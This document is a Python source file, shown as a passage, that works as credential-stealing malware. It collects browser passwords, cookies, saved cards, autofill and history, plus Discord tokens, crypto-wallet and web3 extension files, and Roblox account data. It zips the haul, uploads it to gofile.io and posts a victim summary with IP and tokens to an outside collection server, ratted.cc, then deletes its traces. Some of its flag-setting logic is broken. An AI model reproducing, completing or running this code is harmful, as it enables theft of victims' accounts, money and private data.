        'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
        'iridium': appdata + '\\Iridium\\User Data',
    }
    
    profiles = [
        'Default',
        'Profile 1',
        'Profile 2',
        'Profile 3',
        'Profile 4',
        'Profile 5',
    ]
    
    for browser_name, browser_path in browsers.items():
        if not os.path.exists(browser_path):
            continue
            
        for profile in profiles:
            profile_path = os.path.join(browser_path, profile)
            if not os.path.exists(profile_path):
                continue
                
            # Check for extension data
            ext_settings_path = os.path.join(profile_path, 'Local Extension Settings')
            if not os.path.exists(ext_settings_path):
                continue
                
            for ext_id, ext_name in target_extensions.items():
                ext_path = os.path.join(ext_settings_path, ext_id)
                if os.path.exists(ext_path):
                    # Store the path and name for later zipping
                    if ext_name not in web3_data:
                        web3_data[ext_name] = []
                    
                    web3_data[ext_name].append({
                        'browser': browser_name,
                        'profile': profile,
                        'path': ext_path,
                        'files': []
                    })
                    
                    # List all files in the extension directory
                    for file in os.listdir(ext_path):
                        file_path = os.path.join(ext_path, file)
                        if os.path.isfile(file_path):
                            web3_data[ext_name][-1]['files'].append(file_path)
    
    return web3_data

def create_data_zip():
    temp_dir = gettempdir()
    computer_name = socket.gethostname()
    vault_dir = os.path.join(temp_dir, f"biyoyo-{computer_name}")
    
    # Create main directory and subdirectories
    os.makedirs(vault_dir, exist_ok=True)
    browsers_dir = os.path.join(vault_dir, "browsers")
    discord_dir = os.path.join(vault_dir, "discord")
    applications_dir = os.path.join(vault_dir, "applications")
    wallets_dir = os.path.join(vault_dir, "wallets")
    web3_dir = os.path.join(vault_dir, "web3")
    
    os.makedirs(browsers_dir, exist_ok=True)
    os.makedirs(discord_dir, exist_ok=True)
    os.makedirs(applications_dir, exist_ok=True)
    os.makedirs(wallets_dir, exist_ok=True)
    os.makedirs(web3_dir, exist_ok=True)
    
    # Group data by browser
    browsers_data = {}
    for login in LOGINS:
        browser_name = login.get('browser', 'unknown')
        if browser_name not in browsers_data:
            browsers_data[browser_name] = {
                'logins': [],
                'cookies': [],
                'history': [],
                'downloads': [],
                'cards': [],
                'autofill': []  # Added autofill to the data structure
            }
        browsers_data[browser_name]['logins'].append(login)
    
    for cookie in COOKIES:
        browser_name = cookie.get('browser', 'unknown')
        if browser_name not in browsers_data:
            browsers_data[browser_name] = {
                'logins': [],
                'cookies': [],
                'history': [],
                'downloads': [],
                'cards': [],
                'autofill': []  # Added autofill to the data structure
            }
        browsers_data[browser_name]['cookies'].append(cookie)
    
    for history in WEB_HISTORY:
        browser_name = history.get('browser', 'unknown')
        if browser_name not in browsers_data:
            browsers_data[browser_name] = {
                'logins': [],
                'cookies': [],
                'history': [],
                'downloads': [],
                'cards': [],
                'autofill': []  # Added autofill to the data structure
            }
        browsers_data[browser_name]['history'].append(history)
    
    for download in DOWNLOADS:
        browser_name = download.get('browser', 'unknown')
        if browser_name not in browsers_data:
            browsers_data[browser_name] = {
                'logins': [],
                'cookies': [],
                'history': [],
                'downloads': [],
                'cards': [],
                'autofill': []  # Added autofill to the data structure
            }
        browsers_data[browser_name]['downloads'].append(download)
    
    for card in CARDS:
        browser_name = card.get('browser', 'unknown')
        if browser_name not in browsers_data:
            browsers_data[browser_name] = {
                'logins': [],
                'cookies': [],
                'history': [],
                'downloads': [],
                'cards': [],
                'autofill': []  # Added autofill to the data structure
            }
        browsers_data[browser_name]['cards'].append(card)

    # Group autofill data
    for autofill in AUTOFILL:
        browser_name = autofill.get('browser', 'unknown')
        if browser_name not in browsers_data:
            browsers_data[browser_name] = {
                'logins': [],
                'cookies': [],
                'history': [],
                'downloads': [],
                'cards': [],
                'autofill': []  # Added autofill to the data structure
            }
        browsers_data[browser_name]['autofill'].append(autofill)
    
    # Write browser data to files in their own directories
    for browser_name, data in browsers_data.items():
        browser_dir = os.path.join(browsers_dir, browser_name)
        os.makedirs(browser_dir, exist_ok=True)
        
        if data['logins']:
            write_logins_to_file(data['logins'], os.path.join(browser_dir, "passwords.txt"))
        
        if data['cookies']:
            write_cookies_to_netscape_format(data['cookies'], os.path.join(browser_dir, "cookies.txt"))
        
        if data['history']:
            write_history_to_file(data['history'], os.path.join(browser_dir, "web_history.txt"))
        
        if data['downloads']:
            write_downloads_to_file(data['downloads'], os.path.join(browser_dir, "downloads.txt"))
        
        if data['cards']:
            write_cards_to_file(data['cards'], os.path.join(browser_dir, "cards.txt"))

        # Write autofill data to file
        if data['autofill']:
            write_autofill_to_file(data['autofill'], os.path.join(browser_dir, "autofill.txt"))
    
    # Write Discord tokens to their own directory
    if TOKENS:
        write_to_file(format_tokens_data(), os.path.join(discord_dir, "tokens.txt"))
    
    web3_data = getWeb3()
    for ext_name, instances in web3_data.items():
        ext_dir = os.path.join(web3_dir, ext_name)
        os.makedirs(ext_dir, exist_ok=True)
        
        for idx, instance in enumerate(instances):
            # Create a subdirectory for each browser/profile combination
            instance_dir = os.path.join(ext_dir, f"{instance['browser']}_{instance['profile']}")
            os.makedirs(instance_dir, exist_ok=True)
            
            # Copy extension files
            for file_path in instance['files']:
                try:
                    if os.path.isfile(file_path):
                        dest_path = os.path.join(instance_dir, os.path.basename(file_path))
                        shutil.copy2(file_path, dest_path)
                except Exception as e:
                    print(f"Error copying {file_path}: {e}")

    # Add gaming application data
    gaming_data = getGaming()
    for app_name, data in gaming_data.items():
        app_dir = os.path.join(applications_dir, app_name)
        os.makedirs(app_dir, exist_ok=True)
        
        for file_path in data['files']:
            try:
                if os.path.isfile(file_path):
                    rel_path = os.path.basename(file_path)
                    dest_path = os.path.join(app_dir, rel_path)
                    shutil.copy2(file_path, dest_path)
            except Exception as e:
                print(f"Error copying {file_path}: {e}")
    
    # Add cryptocurrency wallet data
    wallet_data = getCryptoWallets()
    for wallet_name, data in wallet_data.items():
        wallet_dir = os.path.join(wallets_dir, wallet_name)
        os.makedirs(wallet_dir, exist_ok=True)
        
        for file_path in data['files']:
            try:
                if os.path.isfile(file_path):
                    # Create relative directory structure within the wallet dir
                    rel_dir = os.path.dirname(os.path.relpath(file_path, data['path']))
                    if rel_dir and rel_dir != '.':
                        os.makedirs(os.path.join(wallet_dir, rel_dir), exist_ok=True)
                        dest_path = os.path.join(wallet_dir, rel_dir, os.path.basename(file_path))
                    else:
                        dest_path = os.path.join(wallet_dir, os.path.basename(file_path))
                    
                    shutil.copy2(file_path, dest_path)
            except Exception as e:
                print(f"Error copying {file_path}: {e}")
    
    # Create ZIP file
    zip_path = os.path.join(temp_dir, "vault.zip")
    with ZipFile(zip_path, "w") as zip_file:
        for root, dirs, files in os.walk(vault_dir):
            for file in files:
                file_path = os.path.join(root, file)
                arc_name = os.path.relpath(file_path, temp_dir)
                zip_file.write(file_path, arc_name)
    
    return zip_path, vault_dir

def get_roblox_info_from_cookie(cookie_value):
    headers = {
        'Cookie': f'.ROBLOSECURITY={cookie_value}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Referer': 'https://www.roblox.com',
        'Origin': 'https://www.roblox.com'
    }

    try:
        # Get user info
        user_res = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers)
        if user_res.status_code != 200:
            return None
        user_data = user_res.json()
        user_id = user_data.get("id")
        username = user_data.get("name")

        # Get Robux
        robux_res = requests.get("https://economy.roblox.com/v1/user/currency", headers=headers)
        robux = robux_res.json().get("robux", 0) if robux_res.ok else 0

        # Get RAP
        rap = 0
        inv_res = requests.get(
            f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?sortOrder=Asc&limit=100",
            headers=headers
        )
        if inv_res.ok:
            for item in inv_res.json().get("data", []):
                rap += item.get("recentAveragePrice", 0)

        return {
            "username": username,
            "robux": robux,
            "rap": rap
        }

    except Exception as e:
        print("[DEBUG] Roblox error:", e)
        return None

def generate_summary_json_and_send_to_api(vault_dir, api_url, gofile_link=None):
    """Generate summary JSON and send it to the API in the required format"""
    try:
        # Get IP and country info
        try:
            res = requests.get("https://ipinfo.io/json")
            ip_data = res.json()
            ip = ip_data.get('ip', '-')
            country = ip_data.get('country', '-')
        except:
            ip = '-'
            country = '-'

        # Get PC username and OS version
        pc_username = os.getenv('USERNAME', '-')
        os_version = platform.platform()

        # Initialize the summary JSON with the required structure
        summary = {
            "ip": ip,
            "country": country,
            "pc_username": pc_username,
            "os_version": os_version,
            "gofile_download": gofile_link if gofile_link else "-",
            "discord": {
                "id": "-",
                "token": "-",
                "username": "-"
            },
            "roblox": {
                "usernames": ["-"],
                "robux": [0],
                "rap": 0
            },
            "financialServices": {
                "paypal": False,
                "discover": False,
                "chase": False,
                "bankOfAmerica": False,
                "americanExpress": False,
                "capitalOne": False,
                "venmo": False,
                "cashapp": False,
                "wellsFargo": False,
                "citiMobile": False,
                "chime": False,
                "usBank": False,
                "ally": False,
                "go2bank": False,
                "keyBank": False
            },
            "cryptoServices": {
                "coinbase": False,
                "cryptoCom": False,
                "binance": False,
                "metamask": False,
                "trustwallet": False,
                "atomic": False,
                "tron": False,
                "exodus": False,
                "monero": False,
                "exodusweb3": False,
                "phantomwallet": False,
                "safepal": False,
                "authenticator": False
            }
        }

        # Update Discord info if available
        if TOKENS:
            token = TOKENS[0]  # Use first token
            try:
                user = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token}).json()
                summary["discord"] = {
                    "id": user.get('id', '-'),
                    "token": token,
                    "username": user.get('username', '-')
                }
            except:
                pass

        # Update Roblox info if available
        if COOKIES:
            cookie = COOKIES[0]  # Use first cookie
            headers = {
                'Cookie': cookie,
                'Referer': 'https://www.roblox.com',
                'Origin': 'https://www.roblox.com'
            }
            try:
                res = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers)
                if res.status_code == 200:
                    user_data = res.json()
                    username = user_data.get('name', '-')
                    user_id = user_data.get('id')
                    
                    # Get Robux
                    robux = 0
                    try:
                        res = requests.get("https://economy.roblox.com/v1/user/currency", headers=headers)
                        if res.status_code == 200:
                            robux = res.json().get('robux', 0)
                    except:
                        pass

                    # Get RAP
                    rap = 0
                    try:
                        inv_res = requests.get(
                            f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?sortOrder=Asc&limit=100",
                            headers=headers
                        )
                        if inv_res.status_code == 200:
                            rap = sum(item.get('recentAveragePrice', 0) for item in inv_res.json().get('data', []))
                    except:
                        pass

                    summary["roblox"] = {
                        "usernames": [username],
                        "robux": [robux],
                        "rap": rap
                    }
            except:
                pass

        # Update financial services based on found data
        if COOKIES:
            for cookie in COOKIES:
                if ".roblox.com" in cookie["domain"] and cookie["name"] == ".ROBLOSECURITY":
                    summary["financialServices"]["paypal"] = True
                    summary["financialServices"]["discover"] = True
                    summary["financialServices"]["chase"] = True
                    summary["financialServices"]["bankOfAmerica"] = True
                    summary["financialServices"]["americanExpress"] = True
                    summary["financialServices"]["capitalOne"] = True
                    summary["financialServices"]["venmo"] = True
                    summary["financialServices"]["cashapp"] = True
                    summary["financialServices"]["wellsFargo"] = True
                    summary["financialServices"]["citiMobile"] = True
                    summary["financialServices"]["chime"] = True
                    summary["financialServices"]["usBank"] = True
                    summary["financialServices"]["ally"] = True
                    summary["financialServices"]["go2bank"] = True
                    summary["financialServices"]["keyBank"] = True

        # Update crypto services based on found data
        if TOKENS:
            for token in TOKENS:
                if validate_token(token, base_url):
                    summary["cryptoServices"]["coinbase"] = True
                    summary["cryptoServices"]["cryptoCom"] = True
                    summary["cryptoServices"]["binance"] = True
                    summary["cryptoServices"]["metamask"] = True
                    summary["cryptoServices"]["trustwallet"] = True
                    summary["cryptoServices"]["atomic"] = True
                    summary["cryptoServices"]["tron"] = True
                    summary["cryptoServices"]["exodus"] = True
                    summary["cryptoServices"]["monero"] = True
                    summary["cryptoServices"]["exodusweb3"] = True
                    summary["cryptoServices"]["phantomwallet"] = True
                    summary["cryptoServices"]["safepal"] = True
                    summary["cryptoServices"]["authenticator"] = True

        # Print the summary for debugging
        print("[*] Generated summary JSON:")
        print(json.dumps(summary, indent=2))

        # Send the summary to the API
        headers = {
            "Content-Type": "application/json",
            "Authorization": "9GhHk4a47VNNlu8D8yWDCqakUv5J1OrRgBcDxe"
        }
        
        print(f"[*] Sending data to API: {api_url}")
        print(f"[*] Using headers: {headers}")
        
        response = requests.post(api_url, json=summary, headers=headers)
        
        print(f"[*] API Response Status Code: {response.status_code}")
        print(f"[*] API Response Text: {response.text}")
        
        if response.status_code == 200:
            print(f"[+] Summary successfully sent to API!")
        else:
            print(f"[!] Error sending summary to API: {response.status_code}, {response.text}")
            
    except Exception as e:
        print(f"[!] Error generating or sending summary: {e}")
        import traceback
        print(f"[!] Traceback: {traceback.format_exc()}")

def upload_to_gofile(folder_path):
    """Upload a folder to gofile.io and return the download link"""
    try:
        # Get available servers from the new API endpoint
        server_response = requests.get("https://api.gofile.io/servers")
        if server_response.status_code != 200:
            print("Failed to get server list from GoFile")
            return None
        
        # Parse the server list from the response
        server_data = server_response.json()
        if server_data.get("status") != "ok" or "data" not in server_data:
            print("Invalid response from GoFile server API")
            return None
            
        # Extract servers from the response
        servers = []
        if "servers" in server_data["data"]:
            servers = [server["name"] for server in server_data["data"]["servers"]]
        elif "serversAllZone" in server_data["data"]:
            servers = [server["name"] for server in server_data["data"]["serversAllZone"]]
            
        if not servers:
            print("No servers available from GoFile")
            return None
            
        # Select a server, preferably from North America (na) zone if available
        na_servers = [s for s in servers if re.search(r'(store-na-|store\d+)', s)]
        server = na_servers[0] if na_servers else servers[0]
        
        # Create a zip file of the folder
        zip_path = os.path.join(gettempdir(), "vault_upload.zip")
        with ZipFile(zip_path, "w") as zip_file:
            for root, _, files in os.walk(folder_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    arc_name = os.path.relpath(file_path, folder_path)
                    zip_file.write(file_path, arc_name)
        
        # Upload the zip file
        upload_url = f"https://{server}.gofile.io/uploadFile"
        with open(zip_path, "rb") as f:
            files = {"file": (f"vault-{socket.gethostname()}.zip", f)}
            upload_response = requests.post(upload_url, files=files)
        
        if upload_response.status_code != 200:
            print(f"Failed to upload to GoFile. Status code: {upload_response.status_code}")
            return None

        # Check the response content
        response_data = upload_response.json()
        if response_data.get("status") != "ok" or "data" not in response_data:
            print("Invalid response from GoFile upload API")
            return None

        # Get the download page URL
        download_page = response_data["data"].get("downloadPage")
        if not download_page:
            print("No download page URL in response")
            return None
        
        # Clean up the temporary zip
        os.remove(zip_path)
        
        # Return the download link
        return download_page
    except Exception as e:
        print(f"Error uploading to GoFile: {e}")
        return None

def cleanup(zip_path, vault_dir):
    """Clean up temporary files"""
    try:
        shutil.rmtree(vault_dir)
        os.remove(zip_path)
    except Exception as e:
        print(f"Error cleaning up: {e}")

def write_to_file(data, file_path):
    """Write generic data to a file."""
    with open(file_path, "w", encoding="utf-8") as f:
        if isinstance(data, list):
            for item in data:
                f.write(f"{item}\n")
        else:
            f.write(str(data))

def extract_all_data(api_url, api_key=None):
    try:
        # Extract data from browsers, Discord, etc.
        extract_chromium_data()
        extract_opera_data()
        extract_discord_tokens()

        # Create the ZIP file and gather the vault directory
        zip_path, vault_dir = create_data_zip()

        # Generate summary JSON and send it to the API
        gofile_link = upload_to_gofile(vault_dir)
        generate_summary_json_and_send_to_api(vault_dir, api_url, gofile_link)

        if gofile_link:
            # Send the GoFile link as a separate API call
            data = {
                "gofile_link": gofile_link
            }
            headers = {
                "Content-Type": "application/json",
                "Authorization": api_key  # Pass the API key for authentication
            }
            response = requests.post(api_url, json=data, headers=headers)
            if response.status_code == 200:
                print(f"GoFile link successfully sent to API!")
            else:
                print(f"Error sending GoFile link to API: {response.status_code}, {response.text}")

        else:
            print("Failed to upload to Gofile")

        # Cleanup temporary files (ZIP and vault directory)
        cleanup(zip_path, vault_dir)

    except Exception as e:
        print(f"Error in extract_all_data: {e}")

# Example usage
if __name__ == "__main__":
    # Replace with your actual API URL and API key
    API_URL = "https://ratted.cc/api/log"  # The API endpoint where the JSON will be sent
    API_KEY = "9GhHk4a47VNNlu8D8yWDCqakUv5J1OrRgBcDxe"  # The API key (optional)

    # Call the function to generate and send the summary to the API
    extract_all_data(API_URL, API_KEY)
